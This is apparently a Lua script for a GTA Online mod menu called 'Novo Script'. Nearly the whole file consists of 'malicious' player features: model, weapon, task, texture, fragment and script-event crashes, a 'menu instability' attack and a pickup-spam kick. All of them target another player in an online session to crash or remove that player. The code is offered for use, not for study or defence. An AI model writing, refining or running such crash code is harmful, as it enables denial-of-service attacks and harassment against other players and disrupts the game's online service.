Corrupted_Model_Crash = menu.add_player_feature("Corrupted Model Crash", "action", malicious, function(feat, pid)
        local invalidobjecthash = {
            849958566, -568220328, 2155335200, 1272323782, 1296557055,
            29828513, 2250084685, 2349112599, 1599985244, 3523942264,
            3457195100, 3762929870, 1016189997, 861098586, 3245733464,
            2494305715, 671173206, 3769155529, 978689073, 100436592,
            3107991431, 1327834842, 1327834842, 1239708330, 0xA4D194D1,
            0x9CAFCB2, 0x4F7B518F, 0xE6CB661E, -310622473, -500649904
        }
        local uniqueHashes = {}
        for _, hash in ipairs(invalidobjecthash) do
            uniqueHashes[hash] = true
        end

        local crashplayerpos = player.get_player_coords(pid)
        local invalidobj = {}

        setupObjectCrash(pid)
        ChainAttachObjects(pid)

        for hash in pairs(uniqueHashes) do
            streaming.request_model(hash)
            while not streaming.has_model_loaded(hash) do
                system.yield(0)
            end
            table.insert(invalidobj, object.create_world_object(hash, crashplayerpos, true, false))
            system.yield(0) 
        end

        system.yield(1000) 

        for _, obj in ipairs(invalidobj) do
            entity.delete_entity(obj)
            system.yield(0) 
        end
-- ###############################################################################################################################################
end)

invaild_weapon_ped_crash = menu.add_player_feature("Invaild weapon crash", "action", malicious, function(feat, pid)
    local start_coords = player.get_player_coords(player.player_id())
    local target_ped = player.get_player_ped(pid)
    local target_coords = player.get_player_coords(pid)
    streaming.request_model(gameplay.get_hash_key("WEAPON_METALDETECTOR"))
    -- notify of the hash 
--    menu.notify("Hash: " .. tostring(gameplay.get_hash_key("WEAPON_METALDETECTOR")), "Novo Script", 9, 50)
    system.yield(25)
    streaming.request_model(gameplay.get_hash_key("a_c_poodle"))
    while not streaming.has_model_loaded(gameplay.get_hash_key("a_c_poodle")) do
        system.yield(0)
    end
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(target_coords.x, target_coords.y, target_coords.z + 350))
    local spawned_ped = ped.create_ped(26, 0x3F039CBA, target_coords, 0, true, false)
    weapon.give_delayed_weapon_to_ped(spawned_ped, gameplay.get_hash_key("WEAPON_METALDETECTOR"), 1, true)
    weirdcombatstats(spawned_ped, target_ped)
    for i=0,100 do
        target_coords = player.get_player_coords(pid)
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(target_coords.x, target_coords.y, target_coords.z + 350))
        entity.set_entity_coords_no_offset(spawned_ped, target_coords)
        weapon.give_delayed_weapon_to_ped(spawned_ped, gameplay.get_hash_key("WEAPON_METALDETECTOR"), 1, true)
        weirdcombatstats(spawned_ped, target_ped)
        system.yield(5)
    end
    system.yield(10)
    entity.attach_entity_to_entity(spawned_ped, target_ped, 0, v3(0,0,0), v3(0,0,0), false, false, true, 0, true)
    weapon.give_delayed_weapon_to_ped(spawned_ped, gameplay.get_hash_key("WEAPON_METALDETECTOR"), 1, true)
    weirdcombatstats(spawned_ped, target_ped)
    system.yield(25)
    entity.delete_entity(spawned_ped)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), start_coords)
    -- void TASK_THROW_PROJECTILE(Ped ped, float x, float y, float z, int ignoreCollisionEntityIndex, BOOL createInvincibleProjectile) // 0x7285951DBF6B5A51 0xF65C20A7 b323
end)
local attachcarhash = {887537515, -845979911, -1700801569, 223258115, 630371791, -823509173, 1074326203, 444171386}

-- This is a very poorly coded feature, I don't want to spend time fixing it, I don't care about toxic features. Maybe if people ask me to and I have time later I will fix it.
-- It works by using old, uncomon crash methods, that menus patched, but then R* patched in an update and menus didn't remove these protections, so menus keep trying to 'block' it but because R* already did the menus just end up block vaild syncs, events, etc and cause the game to be very unstable for the person who is trying to 'block' it.
-- Can be used to crash people, but it's not very reliable, and must be used very specifically.
Menu_Instability = menu.add_player_feature("Cause Menu Instability", "action", malicious, function(feat, pid)

        menu.notify("Causes targets game to become highly unstable, use sparingly per session!", "Novo Script", 9, 50)

       local function spawn_vehicle_as_mission_entity(modelHash, pos, heading)
           local veh = spawn_vehicle(modelHash, pos, heading)
           entity.set_entity_as_mission_entity(veh, true)
           entity.set_entity_god_mode(veh, true)
           entity.freeze_entity(veh, true)
           return veh
       end


       local load_hashes = {0xFCFCB68B, 0x187D938D, 2132890591, 2727244247, 2598821281, 0xE5A2D6C6, -1881846085, 444583674, 887537515, -845979911, -1700801569, 223258115, 630371791, -823509173, 1074326203, 444171386}
       
       for _, hash in ipairs(load_hashes) do
           streaming.request_model(hash)
           while not streaming.has_model_loaded(hash) do
               system.yield(0)
           end
       end
       

       local pos = player.get_player_coords(pid)
       local target_ped = player.get_player_ped(pid)
       local testrope_1 = rope.add_rope(pos, pos, -1, 0, 1, 2, 0, false, true, true, 207.0, false)
       local cargobob1 = spawn_vehicle_as_mission_entity(0xFCFCB68B, pos, 0)
       local vehicle1 = spawn_vehicle_as_mission_entity(0x187D938D, pos, 0)
       local rope1 = rope.add_rope(pos, v3(0, 0, 10), 1, 1, 0, 1, 1, false, false, false, 1.0, false)
       rope.attach_entities_to_rope(rope1, cargobob1, vehicle1, entity.get_entity_coords(cargobob1), entity.get_entity_coords(vehicle1), 2, 0, 0, "Center", "Center")
       rope.attach_entities_to_rope(testrope_1, cargobob1, player.get_player_ped(pid), entity.get_entity_coords(cargobob1), entity.get_entity_coords(player.get_player_ped(pid)), 2, 0, 0, "Center", "Center")
       entity.attach_entity_to_entity(cargobob1, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
       entity.attach_entity_to_entity(vehicle1, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
   
       pos.x = pos.x + 2
       local rope2 = rope.add_rope(pos, v3(0, 0, 10), 1, 1, 0, 1, 1, false, false, false, 1.0, false)
       local car2 = spawn_vehicle_as_mission_entity(0x187D938D, pos, 0)
       entity.attach_entity_to_entity(car2, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
   
       pos.x = pos.x + 3
       local cargobob3 = spawn_vehicle_as_mission_entity(2132890591, pos, 0)
       pos.z = pos.z + 1
       local kur = ped.create_ped(26, 2727244247, pos, 0, true, false) -- Corrected function call
       entity.set_entity_god_mode(kur, true)
       local rope3 = rope.add_rope(pos, v3(0, 0, 0), 1, 1, 0.0000001, 1, 1, true, true, true, 1.0, true)
       rope.attach_entities_to_rope(rope3, cargobob3, kur, entity.get_entity_coords(cargobob3), entity.get_entity_coords(kur), 2, 0, 0, "Center", "Center")
       entity.attach_entity_to_entity(cargobob3, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
       entity.attach_entity_to_entity(kur, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, true, 0, true)
   
       local mypos = player.get_player_coords(player.player_id())
       mypos.x = mypos.x + 10
       local carc = spawn_vehicle_as_mission_entity(2598821281, mypos, 0)
       local pedc = ped.create_ped(26, 2597531625, mypos, 0, true, false) -- Corrected function call
       local ropec = rope.add_rope(mypos, v3(0, 0, 0), 1, 1, 0.003, 1, 1, true, true, true, 1.0, true)
       rope.attach_entities_to_rope(ropec, carc, pedc, entity.get_entity_coords(carc), entity.get_entity_coords(pedc), 2, 0, 0, "Center", "Center")
       entity.attach_entity_to_entity(cargobob3, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
       entity.attach_entity_to_entity(kur, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, true, 0, true)
   
       local towtruck = spawn_vehicle_as_mission_entity(0xe5a2d6c6, pos, 0)
       entity.set_entity_god_mode(towtruck, true)
       local attachcar = {}
       for i, k in ipairs(attachcarhash) do
           attachcar[i] = spawn_vehicle_as_mission_entity(k, pos, 0)
           entity.set_entity_god_mode(attachcar[i], true)
           entity.attach_entity_to_entity(attachcar[i], towtruck, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
           system.yield(2)
           entity.attach_entity_to_entity(attachcar[i], target_ped, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
       end
       entity.attach_entity_to_entity(towtruck, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)

       local function delete_all_cars()
           for i, car in ipairs(attachcar) do
               entity.delete_entity(car)
           end
           -- Clear the attachcar table
           attachcar = {}
       end
       
       local trailer = spawn_vehicle_as_mission_entity(-1881846085, v3(0, 0, 0), 0)
       local clonePed = ped.clone_ped(player.get_player_ped(pid))
       for _, entityS in ipairs({clonePed, trailer}) do
           entity.set_entity_god_mode(entityS, true)
           entity.freeze_entity(entityS, true)
       end
       entity.attach_entity_to_entity(clonePed, trailer, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
       system.yield(100)
       entity.set_entity_coords_no_offset(trailer, v3(0, 0, 0))
       entity.attach_entity_to_entity(clonePed, target_ped, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
       entity.attach_entity_to_entity(trailer, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
       
   
       local handler = spawn_vehicle_as_mission_entity(444583674, pos, 0)
       local boneveh = entity.get_entity_bone_index_by_name(handler, "frame_1")
       for _, hash in ipairs(attachcarhash) do
           local attachcar = spawn_vehicle_as_mission_entity(hash, pos, 0)
           entity.attach_entity_to_entity(attachcar, handler, boneveh, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
       end
       entity.attach_entity_to_entity(handler, target_ped, 0, v3(0,0,0), v3(0,0,0), false, true, false, 0, true)
   
       -- I don't think this does anything, but it was reccomended that I add it because it can cause instability in menus that handle sound protections inproperly. 
       local soundPos = player.get_player_coords(pid)
           for i = 1, 10 do
               audio.play_sound_from_coord(-1, "5_SEC_WARNING", soundPos, "MP_MISSION_COUNTDOWN_SOUNDSET", true, 10000, false)
           end

       system.yield(1000)
       local entitiesToAttach = {cargobob1, vehicle1, car2, cargobob3, kur, towtruck, trailer, handler, cloneped}
       for i, entitySS in ipairs(entitiesToAttach) do
           entity.attach_entity_to_entity(entitySS, target_ped, 0, v3(0, 0, 0), v3(0, 0, 0), false, true, false, 0, true)
       end
       
       for i, carS in ipairs(attachcar) do
           entity.attach_entity_to_entity(carS, target_ped, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
       end
       for i, carSS in ipairs(attachcar) do
           entity.attach_entity_to_entity(carSS, target_ped, boneveh, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
       end

       streaming.request_model(0x0D7114C9)
       while not streaming.has_model_loaded(0x0D7114C9) do
           system.yield(0)
       end
       streaming.request_model(-1686040670)
       while not streaming.has_model_loaded(-1686040670) do
           system.yield(0)
       end

        local modelIds = {-1686040670, 0x0D7114C9}

        local pedTypes = {2, 0} -- First ped is type 2, second is type 0.

        local peds = {}

        for i, modelId in ipairs(modelIds) do
           local type = pedTypes[i] or 0 -- Default to 0 if pedTypes[i] is nil
        
           peds[i] = ped.create_ped(type, modelId, player.get_player_coords(pid), 0, true, false)
        
           entity.set_entity_visible(peds[i], true)
           entity.set_entity_as_mission_entity(peds[i], true)
        
           ped.set_ped_component_variation(peds[i], 0, 0, 8, 0)
        end


       system.wait(1000)

       for _, sp_ped in ipairs(peds) do
           ped.set_ped_component_variation(sp_ped, 0, 0, 9, 0)
       end

       for i = 1, 100 do
           for _, sp_ped in ipairs(peds) do
               entity.set_entity_coords_no_offset(sp_ped, player.get_player_coords(pid))
               ped.set_ped_component_variation(sp_ped, 0, 0, 8, 0)
               ped.set_ped_component_variation(sp_ped, 0, 0, 9, 0)
           end
           system.yield(5)
       end

       system.yield(1000)

       for _, sp_ped in ipairs(peds) do
           entity.attach_entity_to_entity(sp_ped, player.get_player_ped(pid), 0, v3(0, 0, 0), v3(0, 0, 0), false, true, true, 0, true)
       end

       system.wait(7500)
       menu.notify("Cleaning weird sync entites", "Novo Script", 9, 50)
       for i, entity_dele in ipairs(entitiesToAttach) do
        entity.delete_entity(entity_dele)
    end
       delete_all_cars()
       for i, car_dele in ipairs(attachcarhash) do
           entity.delete_entity(car_dele)
       end

    for i, modelIdSS in ipairs(modelIds) do
        streaming.set_model_as_no_longer_needed(modelIdSS)
    end

    for _, sp_pedS in ipairs(peds) do
        entity.delete_entity(sp_pedS)
    end

   end)

-- menu.add_player_feature(" Test Feature", "action", malicious, function(feat, pid)
--     streaming.request_model(-252946718)
--     while not streaming.has_model_loaded(-252946718) do
--         system.yield(0)
--     end
--     local me = player.get_player_ped(player.player_id())
--     local mycoolds = entity.get_entity_coords(player.get_player_ped(player.player_id()))
--     local there_coords = entity.get_entity_coords(player.get_player_ped(pid))
--     local test_ped = ped.create_ped(26, -252946718, v3(there_coords.x, there_coords.y, there_coords.z + 10), 0, true, false)
--     network.give_player_control_of_entity(pid, test_ped)
--     entity.set_entity_coords_no_offset(test_ped, v3(there_coords.x, there_coords.y, there_coords.z + 10))
--     local ped_net_id = native.call(0xA11700682F3AD45C, test_ped)
--     native.call(0x299EEB23175895FC, ped_net_id, true)
--     menu.notify("control owner is: " .. tostring(network.get_entity_net_owner(test_ped)), "Novo Script", 9, 50)
--     network.give_player_control_of_entity(pid, test_ped)
--     menu.notify("control owner is: " .. tostring(network.get_entity_net_owner(test_ped)), "Novo Script", 9, 50)
--     for i=1, 100 do
--         network.give_player_control_of_entity(pid, test_ped)
--         system.yield(0)
--         if network.get_entity_net_owner(test_ped) == pid then
--             native.call(0x299EEB23175895FC, ped_net_id, false)
--         end
--         menu.notify("control owner is: " .. tostring(network.get_entity_net_owner(test_ped)), "Novo Script", 9, 50)
--     end
-- end)

local threads_spam = {} -- To keep track of active threads for control transfer

local function createThreadForControl(pid, test_ped, onFinish)
    local thread = coroutine.create(function()
        local ped_net_id = native.call(0xA11700682F3AD45C, test_ped)
        native.call(0x299EEB23175895FC, ped_net_id, true)
        native.call(0x299EEB23175895FC, test_ped, true)
        network.give_player_control_of_entity(pid, test_ped)

        for i = 1, 70 do
            network.give_player_control_of_entity(pid, test_ped)
            coroutine.yield()
            if network.get_entity_net_owner(test_ped) == pid then
                native.call(0x299EEB23175895FC, ped_net_id, false)
                native.call(0x299EEB23175895FC, test_ped, false)
                break
            end
        end

        onFinish() -- Execute callback function when thread completes its task
    end)
    table.insert(threads_spam, thread) -- Add the new thread to the threads table
end

-- menu.add_player_feature("Toggle Test Feature", "toggle", malicious, function(feat, pid)
--     feature_enabled = feat.on -- Update toggle state based on feature
--     local target_ped = player.get_player_ped(pid)
-- 
--     streaming.request_model(-252946718)
--     while not streaming.has_model_loaded(-252946718) do
--         system.yield(0)
--     end
-- 
--     menu.notify("Feature is now on", "Novo Script", 9, 50)
-- 
--     while feat.on do
--         menu.notify("Spawning", "Novo Script", 9, 50)
--         local there_coords = entity.get_entity_coords(target_ped)
--         local test_ped = ped.create_ped(26, -252946718, v3(there_coords.x + math.random(-100, 100), there_coords.y + math.random(-100, 100), there_coords.z + math.random(-100, 100)), 0, true, false)
--         entity.set_entity_visible(test_ped, false)
--         entity.attach_entity_to_entity(test_ped, target_ped, 0, v3(0, 0, 0), v3(0, 0, 0), false, false, false, 0, true)
-- 
--         -- Create a thread for giving player control of entity
--         createThreadForControl(pid, test_ped, function()
--             menu.notify("Control transfer complete for PID: " .. tostring(pid), "Novo Script", 9, 50)
--             menu.notify("entity owner is now: " .. tostring(network.get_entity_net_owner(test_ped)), "Novo Script", 9, 50)
--         end)
-- 
--         -- Update threads_spam on each iteration
-- 
--         system.yield(15) -- Yield to prevent freezing; adjust as needed
-- 
--     -- Cleanup code for when the feature is toggled off
--     local all_peds = ped.get_all_peds()
--     if #all_peds > 100 then
--         for _, ped_id in ipairs(all_peds) do
--             if not ped.is_ped_a_player(ped_id) then
--                 network.request_control_of_entity(ped_id)
--                 system.yield(0)
--                 entity.delete_entity(ped_id)
--             end
--         end
--         menu.notify("Deleted all peds", "Novo Script", 9, 50)
--     end
--         -- Ensure all threads are resumed for cleanup if needed
--         for _, thread in ipairs(threads_spam) do
--             if menu.has_thread_finished(thread) == true then
--                 menu.delete_thread(thread)
--             end
--         end
--         table.remove(thread)
-- end
-- end)


-- player needs to be near traffic, tp to them first before using.
menu.add_player_feature("Invalid task crash", "action", malicious, function(feat, pid)
    local start_coords = player.get_player_coords(player.player_id())
    
    for i = 1, 10 do
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), player.get_player_coords(pid))
        system.yield(0)
    end
    
    system.yield(1000)
    
    local all_vehicles = vehicle.get_all_vehicles()
    
    for i = 1, #all_vehicles do
        network.request_control_of_entity(all_vehicles[i])
        native.call(0xF75B0D629E1C063D, player.get_player_ped(pid), all_vehicles[i], 1)
        native.call(0xC429DCEEB339E129, player.get_player_ped(pid), all_vehicles[i], 33, 1)
        entity.set_entity_coords_no_offset(all_vehicles[i], entity.get_entity_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10)
        system.yield(5)
    end
    
    for i = 1, #all_vehicles do
        network.request_control_of_entity(all_vehicles[i])
        native.call(0xF75B0D629E1C063D, player.get_player_ped(pid), all_vehicles[i], 1)
        native.call(0xC429DCEEB339E129, player.get_player_ped(pid), all_vehicles[i], 17, 1)
        entity.set_entity_coords_no_offset(all_vehicles[i], entity.get_entity_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10)
        system.yield(5)
    end
    
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), start_coords)
end)


menu.add_player_feature("Invaild component texture crash", "action", malicious, function(feat, pid)
    local start_coords = player.get_player_coords(player.player_id())
    local pos = player.get_player_coords(pid)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(pos.x, pos.y, pos.z + 350))
    ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))

    local hash = gameplay.get_hash_key("player_zero")
    local attempts = 0
    local maxAttempts = 20

    while not streaming.has_model_loaded(hash) and attempts < maxAttempts do
        streaming.request_model(hash)
        system.yield(0)
        attempts = attempts + 1
    end

    local invalidped = ped.create_ped(26, hash, pos, 0, true, false)
    entity.freeze_entity(invalidped, true)

    while feat.on do
        for i = 0, 600 do
            entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(pos.x, pos.y, pos.z + 350))
            ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))
            pos = player.get_player_coords(pid)
            pos.x = pos.x + math.random(-1, 1)
            pos.y = pos.y + math.random(-1, 1)
            entity.set_entity_coords_no_offset(invalidped, pos)
            ped.set_ped_component_variation(invalidped, 0, math.random(0, 10), math.random(0, 10), 11)
            system.yield(5)
        end
    end

    entity.delete_entity(invalidped)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), start_coords)
end)

pu_kick_arry = {}

menu.add_player_feature("PU Kick", "toggle", malicious, function(feat, pid)
    local empty = {}
    script.trigger_script_event(0xE1FFDAF2, pid, empty)  -- Kick player from vehicle
    ped.clear_ped_tasks_immediately(player.get_player_ped(pid)) -- untested
    system.yield(2700)
    streaming.request_model(gameplay.get_hash_key("prop_skip_05b"))
    while not streaming.has_model_loaded(gameplay.get_hash_key("prop_skip_05b")) do
        system.yield(25)
    end
    local cageObject = object.create_object(gameplay.get_hash_key("prop_skip_05b"), v3(0,0,0), true, false)
    entity.set_entity_rotation(cageObject, v3(0, -180, -180))
    local coords = player.get_player_coords(pid)
    entity.set_entity_coords_no_offset(cageObject, v3(coords.x, coords.y, coords.z + 0.50))
    configure_cage_entity(cageObject)
    local max_pu_attempts = 0
    while feat.on do
        local figure = gameplay.get_hash_key("vw_prop_vw_colle_prbubble")
        streaming.request_model(figure)
        while not streaming.has_model_loaded(figure) do
            system.yield(0)
        end
        for i=1, 150 do
            coords = player.get_player_coords(pid)
            local pickup = native.call(0x673966A0C0FD7171, -1009939663, coords.x, coords.y, coords.z, 0, 1000, figure, false, true)
            system.yield(0)
        end
        system.yield(800)
        allTheThings = object.get_all_pickups()
        for i = 1, #allTheThings do
            local ent = allTheThings[i]
            entity.set_entity_as_no_longer_needed(ent)
            entity.delete_entity(ent)
        end
        if max_pu_attempts > 5 then
            -- attempts other method after some time.
            network.force_remove_player(pid)
        end
        max_pu_attempts = max_pu_attempts + 1
    end
end)

JOB_SE = menu.add_player_feature("Script Event Crash", "action", malicious, function(feat, pid)
    script.trigger_script_event(209000166, pid, {-1638522928, 0, 512, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    script.trigger_script_event(-1638522928, pid, {0, 512, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    script.trigger_script_event(209000166, pid, {-830063381, 0, 512, 1, 0, 0, -1393470468, -982789948, -233612726})
    script.trigger_script_event(-830063381, pid, {0, 512, 1, 0, 0, -1393470468, -982789948, -233612726})
end)

frag_objs = {}
has_sent_frag_crash = false

menu.add_player_feature("better fragment crash", "toggle", malicious, function(feat, pid)
    local startcoords = entity.get_entity_coords(player.get_player_ped(player.player_id()))
    local TargetPlayerPos = player.get_player_coords(pid)
    local myped = player.get_player_ped(player.player_id())
    entity.set_entity_coords_no_offset(myped, v3(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z + 350))
    ped.clear_ped_tasks_immediately(myped)
    
    while feat.on do
        local TargetPlayerPed = player.get_player_ped(pid)
        for i = 0, 10 do
            local TargetPlayerPos = player.get_player_coords(pid)
            entity.set_entity_coords_no_offset(myped, v3(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z + 350))
            ped.clear_ped_tasks_immediately(myped)
            local brokenfragobj = object.create_object(gameplay.get_hash_key("prop_fragtest_cnst_04"), TargetPlayerPos, true, false, false)
            native.call(0xE7E4C198B0185900, brokenfragobj, 1, false)
            table.insert(frag_objs, brokenfragobj)
        end
        
    system.yield(0)  

        for _, obj in ipairs(frag_objs) do
            local TargetPlayerPos = player.get_player_coords(pid)
            entity.set_entity_coords_no_offset(obj, TargetPlayerPos)
            system.yield(10)
            entity.delete_entity(obj)
        end
        
        -- don't spam the menu feat
        if has_sent_frag_crash == false then
            frag_crash.on = true
            has_sent_frag_crash = true
        end

    end
    entity.set_entity_coords_no_offset(myped, startcoords)
    has_sent_frag_crash = false
    frag_objs = {}
end)

spawned_crash_vehs = {}
spawned_crash_peds = {}

better_menu_crash_features = menu.add_player_feature("Better Menu Crash:", "action_value_str", malicious, function(feat, pid)
    local selectedOption = feat.value + 1  -- Increment by 1 due to 0-indexing
    local models = {-252946718, -599568815, 1349725314}
    loadModels(models)
    local there_coords = player.get_player_coords(pid)
    local start_coords = player.get_player_coords(player.player_id())
    if selectedOption == 1 then
        spawn_vehicles_and_peds(pid, 2, -599568815, -252946718, there_coords)
        menu.notify("Sending Crash", "Novo Script")
        give_crash_ent_control(pid)
        enable_spam_features(pid, start_coords)
        spawned_crash_vehs = {}
        spawned_crash_peds = {}
    elseif selectedOption == 2 then
        spawn_bad_vehicles_and_peds(pid, 2, 1349725314, -252946718, there_coords)
        menu.notify("Sending Crash", "Novo Script")
        give_crash_ent_control(pid)
        enable_spam_features(pid, start_coords)
        spawned_crash_vehs = {}
        spawned_crash_peds = {}
    end
end)

better_menu_crash_features:set_str_data({"V1", "V2"})
--idk why this needs to be here but it throws errors randomly if its not.
-- better_menu_crash_features.hint = "teleport to player before using\nmay have to press twice if you don't see a notification"
